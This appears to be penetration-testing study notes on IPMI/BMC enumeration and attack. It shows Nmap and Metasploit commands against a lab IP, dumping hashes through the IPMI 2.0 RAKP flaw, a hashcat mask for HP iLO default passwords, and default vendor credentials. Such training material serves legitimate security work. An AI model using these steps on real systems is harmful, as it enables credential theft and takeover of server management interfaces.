## Nmap Scanning & Footprinting

```
sudo nmap -sU --script ipmi-version -p 623 <IP>
```
    
    - Performs a UDP scan against the default IPMI port (623). It uses the `ipmi-version` NSE script to fingerprint the service, determine the protocol version (e.g., IPMI-2.0), and list the supported authentication methods.

## Metasploit Enumeration & Version Scanning

```
use auxiliary/scanner/ipmi/ipmi_version
```
    
    - Selects the Metasploit auxiliary module designed to probe target hosts for IPMI services and extract version information.
        
```
set rhosts 10.129.42.195
```
    
    - Sets the target IP address for the version scanner.
        
```
run
```
    
    - Executes the scanner to retrieve detailed IPMI version data and supported authentication levels.

##  Dumping Hashes (Exploiting IPMI 2.0 RAKP Flaw)

```
use auxiliary/scanner/ipmi/ipmi_dumphashes
```
    
    - Selects the Metasploit module that leverages a known flaw in the IPMI 2.0 RAKP protocol. The server sends a salted hash of a user's password _before_ authentication takes place, allowing attackers to dump hashes for any valid user account.
        
```
set rhosts 10.129.42.195
```
    
    - Sets the target IP address to extract hashes from.
        
```
run
```
    
    - **Usage:** Executes the module to retrieve the password hashes (and automatically attempts to crack common ones if the `CRACK_COMMON` option is left to true).

## Offline Hash Cracking

```
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

- **Usage:** Uses Hashcat in mask attack mode (`-a 3`) to crack the obtained IPMI hashes (hash mode `7300`). This specific mask (`?1?1?1?1?1?1?1?1` where `?1` is `?d?u`) is highly effective for cracking factory default HP iLO passwords, which consist of 8 randomized numbers and uppercase letters.
## Cheat Sheet Addition: Default BMC Credentials

_(Note: Always try these first before attempting to dump and crack hashes, as administrators frequently leave them unchanged)._

- **Dell iDRAC:** `root` / `calvin`
    
- **HP iLO:** `Administrator` / `[randomized 8-character string of numbers/uppercase letters]`
    
- **Supermicro IPMI:** `ADMIN` / `ADMIN`
